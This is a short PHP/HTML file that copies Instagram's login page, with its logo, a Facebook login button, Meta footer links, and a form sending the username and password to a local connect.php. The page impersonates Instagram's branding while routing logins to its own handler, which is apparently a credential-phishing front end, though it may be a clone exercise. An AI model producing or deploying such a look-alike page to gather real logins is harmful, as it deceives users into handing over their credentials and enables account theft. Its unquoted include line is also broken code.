<? include(connect.php)?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Instagram Login Form </title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css"
        integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="main">

                <div class="logo">
                    <img src="./logo.png" />
                    </div>
                    <div>
                    
              <input type="submit" value="Continue using facebook" class="fb-btn" />
          </div>
          <div class="line-container">
            <div class="line"></div>
            <span class="word">OR</span>
            <div class="line"></div>
        </div>
        <form action="connect.php" method="post">
            
                <div>
                    <input type="text" placeholder="phone number, username or email address" class="username" name="username"/>
                </div>
                        <div>
                        <input type="password" placeholder="password" class="password" name="password" />
                    </div>
                  
                        <div>
                     <input type="submit" value="Log in" class="login-btn" />
                    </div>
</form>
                    <div class="forgot">
                      <h1>Forgotten your password?</h1>
                    </div>
                <div class="signUp">
                    Don't have an account? <a href="#">Sign up</a>
                </div>
           <div class="last">
            <img src="log.jpg" class="lastlog">
           </div>
              
      </div>
      <style>
        .footer {
          position: absolute;
          bottom: 0;
          left: 0;
          width: 100%;
          color: black;
          text-align: center;
          font-size: 12px;
          font-weight: 400;
          line-height: 14px;
          word-spacing: 10px;
          padding-bottom: 0%;
        }
        </style>
        
        <div class="footer">
          <p>Meta About Blog Jobs Help API Privacy Terms</p>
          <p>Location Instagram Lite Threads</p>
          <p>Contact uploading and non-users Meta verified</p>
</div>

</body>
</html>